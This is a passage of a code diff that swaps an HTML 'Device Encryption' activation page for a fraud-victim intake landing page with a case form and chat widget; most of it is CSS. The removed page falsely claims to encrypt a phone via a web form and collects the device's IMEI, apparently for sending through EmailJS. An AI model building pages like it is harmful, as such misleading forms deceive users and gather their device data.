@@ -1,608 +1,1160 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Encryption Tool | Secure Activation</title>
-  <!-- EmailJS SDK -->
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-  </script>
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cyber Fraud Victim Consultation — Confidential Intake</title>
+<meta name="description" content="Confidential intake portal for victims of online fraud, scams and extortion. Submit your case for review and get a case reference.">
 
-    body {
-      min-height: 100vh;
-      background: radial-gradient(circle at 20% 30%, #0b1a2f, #050a14);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 2rem 1.5rem;
-    }
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
-    .container {
-      max-width: 860px;
-      width: 100%;
-      background: rgba(12, 20, 35, 0.8);
-      backdrop-filter: blur(12px);
-      border-radius: 48px;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      box-shadow: 0 30px 60px -20px rgba(0, 0, 0, 0.8);
-      padding: 2.2rem 2.5rem;
-      transition: 0.3s;
-    }
+<style>
+/* ============================================================
+   DESIGN TOKENS
+   ============================================================ */
+:root{
+  --blue-50:#eff6ff;
+  --blue-100:#dbeafe;
+  --blue-200:#bfdbfe;
+  --blue-500:#3b82f6;
+  --blue-600:#2563eb;
+  --blue-700:#1d4ed8;
+  --cyan-500:#06b6d4;
+  --cyan-600:#0891b2;
 
-    @media (max-width: 600px) {
-      .container { padding: 1.5rem; }
-    }
+  --ink:#0b1b33;
+  --text:#1e293b;
+  --muted:#64748b;
+  --line:#e2e8f0;
+  --line-2:#eef2f9;
 
-    .header {
-      text-align: center;
-      margin-bottom: 2.2rem;
-    }
+  --ok:#22c55e;
+  --danger:#ef4444;
 
-    .lock-icon {
-      font-size: 3.2rem;
-      color: #4fc3f7;
-      background: rgba(79, 195, 247, 0.12);
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 0.8rem;
-      border: 1px solid rgba(79, 195, 247, 0.25);
-    }
+  --radius:24px;
+  --shadow-sm:0 1px 2px rgba(15,42,90,.06);
+  --shadow-md:0 18px 40px -22px rgba(15,42,90,.28);
+  --shadow-lg:0 40px 90px -50px rgba(15,42,90,.35);
+}
 
-    h1 {
-      font-size: 2.2rem;
-      font-weight: 700;
-      letter-spacing: 0.5px;
-      background: linear-gradient(135deg, #e0f2fe, #a5d8ff);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-    }
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  font-family:'Plus Jakarta Sans',system-ui,-apple-system,'Segoe UI',sans-serif;
+  color:var(--text);
+  background:#fff;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+img,svg{display:block}
+.wrap{width:min(1120px,92vw);margin-inline:auto;position:relative;z-index:1}
 
-    .subtitle {
-      color: #94a9c9;
-      font-size: 0.95rem;
-      margin-top: 6px;
-      border-top: 1px solid #1f2f4a;
-      padding-top: 10px;
-    }
+/* ============================================================
+   NAV
+   ============================================================ */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(255,255,255,.84);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--line-2);
+}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;gap:1rem;height:70px}
+.brand{display:flex;align-items:center;gap:.65rem;text-decoration:none;color:var(--ink);font-weight:800;letter-spacing:-.02em;font-size:1.02rem}
+.brand-mark{
+  width:38px;height:38px;border-radius:12px;display:grid;place-items:center;color:#fff;
+  background:linear-gradient(135deg,#2563eb,#06b6d4);
+  box-shadow:0 10px 22px -10px rgba(37,99,235,.8);
+}
+.nav-links{display:flex;gap:1.7rem;list-style:none;margin:0;padding:0}
+.nav-links a{color:var(--muted);text-decoration:none;font-size:.9rem;font-weight:600;transition:color .18s}
+.nav-links a:hover{color:var(--blue-600)}
+.nav-cta{
+  display:inline-flex;align-items:center;gap:.5rem;
+  font-size:.86rem;font-weight:700;text-decoration:none;color:#fff;
+  background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  padding:.62rem 1.15rem;border-radius:11px;
+  box-shadow:0 12px 26px -12px rgba(37,99,235,.85);
+  transition:transform .16s,box-shadow .2s;
+}
+.nav-cta:hover{transform:translateY(-1px);box-shadow:0 16px 30px -12px rgba(37,99,235,.95)}
+@media(max-width:880px){.nav-links{display:none}}
 
-    .device-badge {
-      display: inline-flex;
-      gap: 12px;
-      background: #0f1b30;
-      padding: 6px 18px;
-      border-radius: 40px;
-      font-size: 0.8rem;
-      color: #b0c9f0;
-      margin-top: 8px;
-      border: 1px solid #2a3f60;
-    }
+/* ============================================================
+   HERO
+   ============================================================ */
+.hero{
+  position:relative;overflow:hidden;
+  padding:5.2rem 0 4rem;
+  background:
+    radial-gradient(900px 480px at 10% -12%, #dbeafe 0%, transparent 62%),
+    radial-gradient(780px 420px at 92% -4%, #e0f2fe 0%, transparent 58%),
+    linear-gradient(180deg,#f7fbff 0%,#ffffff 78%);
+}
+.blob{position:absolute;border-radius:50%;filter:blur(64px);opacity:.55;pointer-events:none;z-index:0}
+.blob.b1{width:400px;height:400px;background:#bfdbfe;top:-140px;left:-120px;animation:float 15s ease-in-out infinite}
+.blob.b2{width:320px;height:320px;background:#bae6fd;right:-90px;top:60px;animation:float 19s ease-in-out infinite reverse}
+@keyframes float{50%{transform:translateY(26px)}}
 
-    .form-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 1.4rem;
-    }
+.hero-grid{display:grid;grid-template-columns:1.06fr .94fr;gap:3.2rem;align-items:center}
+@media(max-width:960px){.hero-grid{grid-template-columns:1fr;gap:2.6rem}}
 
-    .form-row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1.2rem;
-    }
+.badge{
+  display:inline-flex;align-items:center;gap:.5rem;
+  padding:.42rem .95rem;border-radius:999px;
+  background:#eff6ff;border:1px solid #dbeafe;color:var(--blue-700);
+  font-size:.74rem;font-weight:800;letter-spacing:.09em;text-transform:uppercase;
+}
+.badge .pulse{width:7px;height:7px;border-radius:50%;background:var(--ok);animation:pulse 2.2s infinite}
+@keyframes pulse{
+  0%{box-shadow:0 0 0 0 rgba(34,197,94,.55)}
+  70%{box-shadow:0 0 0 9px rgba(34,197,94,0)}
+  100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}
+}
 
-    .form-row .form-group {
-      flex: 1;
-      min-width: 180px;
-    }
+h1{
+  font-size:clamp(2.1rem,4.6vw,3.4rem);
+  line-height:1.06;letter-spacing:-.035em;
+  margin:1.25rem 0 1.1rem;color:var(--ink);font-weight:800;
+}
+h1 .grad{
+  background:linear-gradient(100deg,#2563eb 10%,#06b6d4 90%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.lead{max-width:56ch;color:var(--muted);font-size:1.03rem;margin:0}
 
-    .form-group {
-      display: flex;
-      flex-direction: column;
-      gap: 5px;
-    }
+.cta-row{display:flex;flex-wrap:wrap;gap:.8rem;margin-top:2rem}
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:.55rem;
+  font-family:inherit;font-size:.92rem;font-weight:700;
+  border-radius:13px;padding:.92rem 1.6rem;cursor:pointer;
+  text-decoration:none;border:1px solid transparent;
+  transition:transform .16s,box-shadow .22s,background .2s;
+}
+.btn-primary{
+  color:#fff;background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  box-shadow:0 18px 34px -16px rgba(37,99,235,.9);
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 22px 40px -16px rgba(37,99,235,1)}
+.btn-ghost{
+  color:var(--blue-700);background:#fff;border-color:#dbeafe;
+  box-shadow:var(--shadow-sm);
+}
+.btn-ghost:hover{transform:translateY(-2px);background:#f8fbff;box-shadow:0 14px 26px -18px rgba(15,42,90,.4)}
 
-    label {
-      font-size: 0.8rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: #9bb1d4;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
+.stats{display:flex;flex-wrap:wrap;gap:2.4rem;margin-top:2.6rem;padding-top:1.7rem;border-top:1px solid var(--line-2)}
+.stat strong{display:block;font-size:1.35rem;font-weight:800;color:var(--blue-700);letter-spacing:-.02em}
+.stat span{font-size:.8rem;color:var(--muted);font-weight:600}
 
-    label i {
-      font-size: 0.9rem;
-      color: #4fc3f7;
-    }
+/* floating case-file mock */
+.hero-card{
+  position:relative;z-index:1;
+  background:rgba(255,255,255,.78);
+  backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
+  border:1px solid #e6eefc;border-radius:26px;
+  padding:1.5rem 1.6rem;
+  box-shadow:0 50px 90px -50px rgba(30,64,175,.45);
+  animation:rise .9s cubic-bezier(.2,.7,.3,1) both;
+}
+@keyframes rise{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+.hc-top{display:flex;align-items:center;gap:.5rem;font-size:.72rem;font-weight:800;letter-spacing:.08em;color:#475569;text-transform:uppercase}
+.hc-top .pulse{width:7px;height:7px;border-radius:50%;background:var(--blue-500);animation:pulse 2.2s infinite}
+.hc-pill{margin-left:auto;font-size:.68rem;font-weight:800;color:#166534;background:#dcfce7;border:1px solid #bbf7d0;border-radius:999px;padding:.2rem .6rem;letter-spacing:.05em}
+.hc-row{display:flex;align-items:center;gap:.8rem;margin-top:1.15rem}
+.hc-row .k{font-size:.76rem;font-weight:700;color:#64748b;width:82px;flex:0 0 82px}
+.skel{
+  flex:1;height:10px;border-radius:6px;
+  background:linear-gradient(90deg,#e8f0fe 25%,#f5f9ff 37%,#e8f0fe 63%);
+  background-size:400% 100%;animation:shimmer 1.9s linear infinite;
+}
+@keyframes shimmer{0%{background-position:100% 0}100%{background-position:-100% 0}}
+.hc-progress{height:8px;border-radius:99px;background:#eef4ff;margin-top:1.4rem;overflow:hidden}
+.hc-progress span{display:block;height:100%;width:68%;border-radius:99px;background:linear-gradient(90deg,#2563eb,#06b6d4)}
+.hc-foot{display:flex;align-items:center;gap:.55rem;margin-top:1.3rem;font-size:.76rem;color:#475569;font-weight:600}
+.hc-avatar{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#93c5fd,#67e8f9);border:2px solid #fff;box-shadow:0 4px 10px -4px rgba(37,99,235,.6)}
 
-    .required:after {
-      content: "*";
-      color: #f87171;
-      margin-left: 4px;
-    }
+/* ============================================================
+   SECTION HEADINGS
+   ============================================================ */
+.section{padding:4.2rem 0}
+.section-head{text-align:center;max-width:740px;margin:0 auto 2.3rem}
+.eyebrow{
+  margin:0;font-size:.74rem;font-weight:800;letter-spacing:.2em;
+  text-transform:uppercase;color:var(--blue-600);
+}
+.section-title{
+  margin:.55rem 0 0;font-size:clamp(1.5rem,3vw,2.1rem);
+  letter-spacing:-.025em;color:var(--ink);font-weight:800;line-height:1.2;
+}
+.section-sub{margin:.7rem auto 0;color:var(--muted);font-size:.95rem;max-width:60ch}
 
-    input,
-    select,
-    textarea {
-      width: 100%;
-      padding: 12px 16px;
-      background: #0d172b;
-      border: 1px solid #263450;
-      border-radius: 20px;
-      color: #edf2fb;
-      font-size: 0.95rem;
-      transition: 0.2s;
-      outline: none;
-    }
+/* ============================================================
+   VIDEO
+   ============================================================ */
+.video-card{
+  background:#fff;border:1px solid var(--line-2);border-radius:var(--radius);
+  padding:clamp(.9rem,2.4vw,1.5rem);
+  box-shadow:var(--shadow-md);
+  display:flex;justify-content:center;overflow:hidden;
+}
+.video-card blockquote{margin:0 !important}
 
-    input:focus,
-    select:focus,
-    textarea:focus {
-      border-color: #4fc3f7;
-      box-shadow: 0 0 0 3px rgba(79, 195, 247, 0.2);
-      background: #0f1c34;
-    }
+/* ============================================================
+   FORM SECTION
+   ============================================================ */
+.form-section{
+  background:linear-gradient(180deg,#f7fbff 0%,#eef5ff 100%);
+  border-top:1px solid #eaf1fc;border-bottom:1px solid #eaf1fc;
+  padding:4.6rem 0 5.2rem;scroll-margin-top:84px;
+}
+.form-grid{display:grid;grid-template-columns:.82fr 1.18fr;gap:2.8rem;align-items:start}
+@media(max-width:980px){.form-grid{grid-template-columns:1fr;gap:2.2rem}}
 
-    textarea {
-      resize: vertical;
-      min-height: 70px;
-    }
+.form-aside{position:sticky;top:96px}
+@media(max-width:980px){.form-aside{position:static}}
+.form-aside h2{margin:.5rem 0 0;font-size:1.55rem;letter-spacing:-.025em;color:var(--ink);font-weight:800;line-height:1.2}
+.steps{list-style:none;margin:1.8rem 0 0;padding:0;display:grid;gap:1.2rem}
+.steps li{display:flex;gap:.95rem}
+.steps .num{
+  flex:0 0 36px;height:36px;border-radius:11px;
+  background:#fff;border:1px solid #dbeafe;color:var(--blue-600);
+  display:grid;place-items:center;font-weight:800;font-size:.85rem;
+  box-shadow:0 8px 16px -10px rgba(37,99,235,.7);
+}
+.steps strong{display:block;font-size:.95rem;color:var(--ink);letter-spacing:-.01em}
+.steps p{margin:.15rem 0 0;font-size:.85rem;color:var(--muted);line-height:1.55}
 
-    .file-upload-wrapper {
-      position: relative;
-      border: 1px dashed #3a4f72;
-      border-radius: 20px;
-      padding: 1.2rem 1rem;
-      text-align: center;
-      background: #0a1424;
-      cursor: pointer;
-      transition: 0.2s;
-    }
+.aside-note{
+  margin-top:1.9rem;padding:1rem 1.1rem;border-radius:14px;
+  background:#fff;border:1px solid #e6eefc;
+  font-size:.83rem;color:#475569;box-shadow:var(--shadow-sm);
+}
+.aside-note strong{color:var(--blue-700)}
 
-    .file-upload-wrapper:hover {
-      border-color: #4fc3f7;
-      background: #0d1a30;
-    }
+/* ---------- form card ---------- */
+.form-card{
+  background:#fff;border:1px solid #e6eefc;border-radius:var(--radius);
+  padding:clamp(1.3rem,3vw,2.3rem);
+  box-shadow:var(--shadow-lg);
+}
+.card-head{
+  display:flex;flex-wrap:wrap;gap:1rem;align-items:center;justify-content:space-between;
+  padding-bottom:1.35rem;margin-bottom:1.7rem;border-bottom:1px solid var(--line-2);
+}
+.card-head h2{margin:0;font-size:1.28rem;letter-spacing:-.02em;color:var(--ink);font-weight:800}
+.card-head p{margin:.25rem 0 0;font-size:.83rem;color:var(--muted)}
+.ref-chip{
+  font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+  font-size:.76rem;font-weight:700;letter-spacing:.06em;
+  padding:.5rem .85rem;border-radius:10px;
+  background:var(--blue-50);border:1px solid var(--blue-200);
+  color:var(--blue-700);white-space:nowrap;
+}
 
-    .file-upload-wrapper input[type="file"] {
-      position: absolute;
-      inset: 0;
-      opacity: 0;
-      cursor: pointer;
-    }
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:1.15rem}
+.field{display:flex;flex-direction:column}
+.field.full{grid-column:1 / -1}
+@media(max-width:720px){.grid{grid-template-columns:1fr}}
 
-    .file-upload-wrapper .upload-icon {
-      font-size: 2rem;
-      color: #5b7ca0;
-    }
+label{display:block;font-size:.82rem;font-weight:700;color:#334155;margin-bottom:.42rem}
+.req{color:var(--blue-600)}
+.hint{display:block;font-weight:500;font-size:.76rem;color:var(--muted);margin-top:.15rem}
 
-    .file-upload-wrapper .file-name {
-      margin-top: 6px;
-      font-size: 0.8rem;
-      color: #8aa3c7;
-      word-break: break-all;
-    }
+input,select,textarea{
+  width:100%;font-family:inherit;font-size:.94rem;color:var(--ink);
+  background:#f8fafc;border:1px solid var(--line);border-radius:12px;
+  padding:.8rem .95rem;
+  transition:border-color .18s,box-shadow .18s,background .18s;
+  appearance:none;-webkit-appearance:none;
+}
+textarea{resize:vertical;min-height:150px;line-height:1.6}
+select{
+  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+  background-repeat:no-repeat;background-position:right .9rem center;
+  padding-right:2.4rem;cursor:pointer;
+}
+input::placeholder,textarea::placeholder{color:#94a3b8}
+input:focus,select:focus,textarea:focus{
+  outline:none;background:#fff;border-color:var(--blue-500);
+  box-shadow:0 0 0 4px rgba(59,130,246,.14);
+}
+input:invalid:not(:placeholder-shown),
+textarea:invalid:not(:placeholder-shown){border-color:rgba(239,68,68,.6)}
 
-    .file-upload-wrapper .upload-hint {
-      font-size: 0.7rem;
-      color: #6b8bb0;
-    }
+.consent{
+  grid-column:1 / -1;
+  display:flex;gap:.75rem;align-items:flex-start;
+  margin-top:.35rem;padding:1rem 1.1rem;
+  border:1px solid var(--blue-200);border-radius:13px;
+  background:var(--blue-50);
+}
+.consent input[type="checkbox"]{
+  width:18px;height:18px;flex:0 0 auto;margin:.18rem 0 0;
+  accent-color:var(--blue-600);cursor:pointer;
+}
+.consent label{margin:0;font-weight:500;font-size:.85rem;color:#334155;line-height:1.55;cursor:pointer}
 
-    .checkbox-group {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin: 0.4rem 0;
-    }
+.actions{
+  grid-column:1 / -1;
+  display:flex;flex-wrap:wrap;align-items:center;gap:1rem;
+  margin-top:.8rem;padding-top:1.5rem;border-top:1px solid var(--line-2);
+}
+.btn-submit{
+  font-family:inherit;font-size:.88rem;font-weight:800;
+  letter-spacing:.06em;text-transform:uppercase;color:#fff;
+  background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  border:none;border-radius:13px;padding:1rem 1.9rem;cursor:pointer;
+  display:inline-flex;align-items:center;gap:.6rem;
+  box-shadow:0 20px 38px -18px rgba(37,99,235,.95);
+  transition:transform .16s,box-shadow .22s,opacity .2s;
+}
+.btn-submit:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 24px 44px -18px rgba(37,99,235,1)}
+.btn-submit:disabled{opacity:.65;cursor:not-allowed}
+.btn-submit .spinner{
+  width:16px;height:16px;border-radius:50%;
+  border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+  display:none;animation:spin .7s linear infinite;
+}
+.btn-submit.loading .spinner{display:block}
+@keyframes spin{to{transform:rotate(360deg)}}
+.secure-note{font-size:.79rem;color:var(--muted);display:flex;align-items:center;gap:.45rem}
 
-    .checkbox-group input {
-      width: 20px;
-      height: 20px;
-      accent-color: #4fc3f7;
-    }
+.status{
+  grid-column:1 / -1;display:none;
+  padding:.95rem 1.1rem;border-radius:12px;font-size:.9rem;line-height:1.55;
+  border:1px solid transparent;
+}
+.status.show{display:block}
+.status.ok{background:#f0fdf4;border-color:#bbf7d0;color:#166534}
+.status.err{background:#fef2f2;border-color:#fecaca;color:#991b1b}
+.status a{color:inherit;font-weight:700}
 
-    .btn-group {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 16px;
-      margin-top: 0.8rem;
-    }
+/* ============================================================
+   FOOTER
+   ============================================================ */
+footer{background:#fff;padding:3rem 0 2.4rem;font-size:.83rem;color:var(--muted)}
+footer .wrap{display:grid;gap:1.1rem}
+.disclaimer{
+  padding:1.1rem 1.2rem;border-left:3px solid var(--blue-600);
+  background:#f7fbff;border-radius:0 12px 12px 0;max-width:86ch;color:#475569;
+}
+.disclaimer strong{color:var(--ink)}
+.footer-bottom{
+  display:flex;flex-wrap:wrap;gap:.8rem;justify-content:space-between;
+  padding-top:1.1rem;border-top:1px solid var(--line-2);font-size:.78rem;
+}
 
-    .btn-primary {
-      padding: 14px 32px;
-      border: none;
-      border-radius: 60px;
-      font-weight: 700;
-      font-size: 1rem;
-      background: linear-gradient(135deg, #0e7ac7, #1d4ed8);
-      color: white;
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 6px 20px rgba(29, 78, 216, 0.3);
-      flex: 1;
-      justify-content: center;
-    }
+/* ============================================================
+   LIVE CHAT
+   ============================================================ */
+.chat-launcher{
+  position:fixed;right:22px;bottom:22px;z-index:80;
+  width:62px;height:62px;border-radius:50%;border:none;cursor:pointer;
+  color:#fff;display:grid;place-items:center;
+  background:linear-gradient(135deg,#2563eb,#0891b2);
+  box-shadow:0 22px 44px -14px rgba(37,99,235,.85);
+  transition:transform .2s,box-shadow .25s;
+}
+.chat-launcher:hover{transform:translateY(-3px) scale(1.03);box-shadow:0 26px 50px -14px rgba(37,99,235,1)}
+.chat-launcher::after{
+  content:"";position:absolute;inset:-6px;border-radius:50%;
+  border:2px solid rgba(37,99,235,.4);
+  animation:ring 2.8s ease-out infinite;
+  pointer-events:none;
+}
+@keyframes ring{
+  0%{transform:scale(.9);opacity:.9}
+  70%{transform:scale(1.28);opacity:0}
+  100%{opacity:0}
+}
+.chat-launcher .icon-close{display:none}
+.chat-launcher.is-open .icon-chat{display:none}
+.chat-launcher.is-open .icon-close{display:block}
+.chat-launcher.is-open::after{display:none}
+.chat-badge{
+  position:absolute;top:-2px;right:-2px;width:20px;height:20px;border-radius:50%;
+  background:var(--ok);color:#fff;font-size:.66rem;font-weight:800;
+  display:grid;place-items:center;border:2px solid #fff;
+}
+.chat-launcher.is-open .chat-badge{display:none}
 
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 28px rgba(29, 78, 216, 0.4);
-    }
+.chat-panel{
+  position:fixed;right:22px;bottom:96px;z-index:81;
+  width:min(376px,calc(100vw - 32px));
+  height:min(580px,calc(100vh - 140px));
+  background:#fff;border-radius:22px;overflow:hidden;
+  display:flex;flex-direction:column;
+  border:1px solid #e6eefc;
+  box-shadow:0 50px 100px -35px rgba(15,42,90,.55);
+  opacity:0;transform:translateY(18px) scale(.97);pointer-events:none;
+  transition:opacity .25s,transform .28s cubic-bezier(.2,.8,.3,1);
+}
+.chat-panel.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
 
-    .btn-primary:active {
-      transform: scale(0.97);
-    }
+.chat-head{
+  display:flex;align-items:center;gap:.75rem;padding:.95rem 1rem;
+  background:linear-gradient(135deg,#1d4ed8,#2563eb 55%,#0891b2);
+  color:#fff;flex:0 0 auto;
+}
+.chat-avatar{
+  width:40px;height:40px;border-radius:13px;flex:0 0 40px;
+  display:grid;place-items:center;
+  background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.28);
+}
+.chat-head h3{margin:0;font-size:.93rem;font-weight:800;letter-spacing:-.01em}
+.chat-head p{margin:0;font-size:.72rem;opacity:.9;display:flex;align-items:center;gap:.35rem}
+.chat-head .dot{width:7px;height:7px;border-radius:50%;background:#4ade80}
+.chat-close{
+  margin-left:auto;width:32px;height:32px;border-radius:9px;border:none;cursor:pointer;
+  background:rgba(255,255,255,.15);color:#fff;display:grid;place-items:center;
+  transition:background .18s;
+}
+.chat-close:hover{background:rgba(255,255,255,.28)}
 
-    .btn-secondary {
-      padding: 14px 24px;
-      border: 1px solid #314a6a;
-      border-radius: 60px;
-      background: transparent;
-      color: #b0c9f0;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-    }
+.chat-body{
+  flex:1;overflow-y:auto;padding:1.1rem;
+  display:flex;flex-direction:column;gap:.7rem;background:#f8fbff;
+  scrollbar-width:thin;
+}
+.chat-body::-webkit-scrollbar{width:6px}
+.chat-body::-webkit-scrollbar-thumb{background:#dbeafe;border-radius:99px}
 
-    .btn-secondary:hover {
-      background: #14243e;
-      border-color: #4a6a92;
-    }
+.msg{display:flex;animation:msgIn .25s ease both}
+@keyframes msgIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.msg.user{justify-content:flex-end}
+.bubble{
+  max-width:84%;padding:.66rem .92rem;border-radius:16px;
+  font-size:.88rem;line-height:1.52;white-space:pre-line;word-break:break-word;
+}
+.msg.bot .bubble{
+  background:#fff;border:1px solid #e6eefc;color:#1e293b;
+  border-bottom-left-radius:6px;box-shadow:0 6px 14px -12px rgba(15,42,90,.5);
+}
+.msg.user .bubble{
+  background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;
+  border-bottom-right-radius:6px;box-shadow:0 10px 20px -14px rgba(37,99,235,.9);
+}
+.typing .bubble{display:flex;gap:4px;align-items:center;padding:.8rem .95rem}
+.tdot{width:6px;height:6px;border-radius:50%;background:#94a3b8;animation:blink 1.2s infinite}
+.tdot:nth-child(2){animation-delay:.15s}
+.tdot:nth-child(3){animation-delay:.3s}
+@keyframes blink{0%,80%,100%{opacity:.25;transform:translateY(0)}40%{opacity:1;transform:translateY(-2px)}}
 
-    .info-note {
-      background: #0b162b;
-      border-radius: 24px;
-      padding: 1rem 1.4rem;
-      margin-top: 1.8rem;
-      font-size: 0.8rem;
-      color: #8da4c9;
-      border-left: 3px solid #1d4ed8;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
+.chat-quick{
+  display:flex;flex-wrap:wrap;gap:.45rem;
+  padding:.1rem 1rem .7rem;background:#f8fbff;flex:0 0 auto;
+}
+.chat-quick.empty{display:none}
+.quick{
+  font-family:inherit;font-size:.78rem;font-weight:700;
+  color:var(--blue-700);background:#eff6ff;border:1px solid #dbeafe;
+  border-radius:999px;padding:.42rem .78rem;cursor:pointer;
+  transition:background .15s,transform .15s;
+}
+.quick:hover{background:#dbeafe;transform:translateY(-1px)}
 
-    .info-note i {
-      font-size: 1.2rem;
-      color: #4fc3f7;
-    }
+.chat-input{
+  display:flex;gap:.5rem;padding:.7rem;
+  border-top:1px solid var(--line-2);background:#fff;flex:0 0 auto;
+}
+.chat-input input{
+  flex:1;border-radius:12px;background:#f8fafc;padding:.68rem .85rem;font-size:.88rem;
+}
+.chat-send{
+  width:44px;height:44px;flex:0 0 44px;border-radius:12px;border:none;cursor:pointer;
+  color:#fff;display:grid;place-items:center;
+  background:linear-gradient(135deg,#2563eb,#1d4ed8);
+  transition:transform .15s,box-shadow .2s;
+  box-shadow:0 12px 22px -12px rgba(37,99,235,.9);
+}
+.chat-send:hover{transform:translateY(-1px)}
 
-    .toast-msg {
-      position: fixed;
-      bottom: 25px;
-      right: 25px;
-      background: #111d33;
-      border-left: 5px solid #10b981;
-      padding: 14px 24px;
-      border-radius: 40px;
-      color: #e8f0fe;
-      font-size: 0.9rem;
-      backdrop-filter: blur(16px);
-      z-index: 999;
-      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5);
-      max-width: 90%;
-    }
+@media(max-width:520px){
+  .chat-panel{right:12px;bottom:88px;width:calc(100vw - 24px);height:min(560px,calc(100vh - 120px))}
+  .chat-launcher{right:16px;bottom:16px}
+}
 
-    .loading {
-      opacity: 0.7;
-      pointer-events: none;
-    }
-
-    .footer {
-      margin-top: 2rem;
-      text-align: center;
-      font-size: 0.7rem;
-      color: #5a7396;
-      border-top: 1px solid #1c2d47;
-      padding-top: 1.2rem;
-    }
-
-    @media (max-width: 480px) {
-      .container { padding: 1.2rem; }
-      h1 { font-size: 1.6rem; }
-    }
-  </style>
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.001ms !important;animation-iteration-count:1 !important;transition-duration:.001ms !important}
+  html{scroll-behavior:auto}
+}
+</style>
 </head>
+
 <body>
 
-  <div class="container">
-    <div class="header">
-      <div class="lock-icon">
-        <i class="fas fa-lock"></i>
-      </div>
-      <h1>Device Encryption</h1>
-      <div class="subtitle">
-        <i class="fas fa-shield-alt" style="color:#4fc3f7;"></i> Secure your iOS or Android device with military‑grade encryption
-      </div>
-      <div class="device-badge">
-        <i class="fab fa-apple"></i> iOS &nbsp;|&nbsp; <i class="fab fa-android"></i> Android
-      </div>
-    </div>
+<!-- ============================ NAV ============================ -->
+<nav class="nav">
+  <div class="wrap">
+    <a class="brand" href="#top">
+      <span class="brand-mark" aria-hidden="true">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2 20 5v6c0 5.3-3.6 9.1-8 11-4.4-1.9-8-5.7-8-11V5z"/>
+          <path d="m8.5 12 2.5 2.5 4.5-5"/>
+        </svg>
+      </span>
+      Fraud Victim Intake
+    </a>
 
-    <form id="encryptionForm" class="form-grid">
-      <!-- Device Selection -->
-      <div class="form-row">
-        <div class="form-group">
-          <label class="required"><i class="fas fa-mobile-alt"></i> Device OS</label>
-          <select id="deviceOS" required>
-            <option value="">-- Select --</option>
-            <option value="iOS">iOS (iPhone/iPad)</option>
-            <option value="Android">Android</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label class="required"><i class="fas fa-hashtag"></i> Device ID / IMEI</label>
-          <input type="text" id="deviceID" placeholder="e.g., F2L9R4G8H" required>
-        </div>
-      </div>
+    <ul class="nav-links">
+      <li><a href="#top">Overview</a></li>
+      <li><a href="#briefing">Briefing</a></li>
+      <li><a href="#report">Report a Case</a></li>
+    </ul>
 
-      <!-- Encryption Key -->
-      <div class="form-row">
-        <div class="form-group">
-          <label class="required"><i class="fas fa-key"></i> Enter IMEI</label>
-          <input type="text" id="encryptionKey" placeholder="Enter IMEI" required>
-        </div>
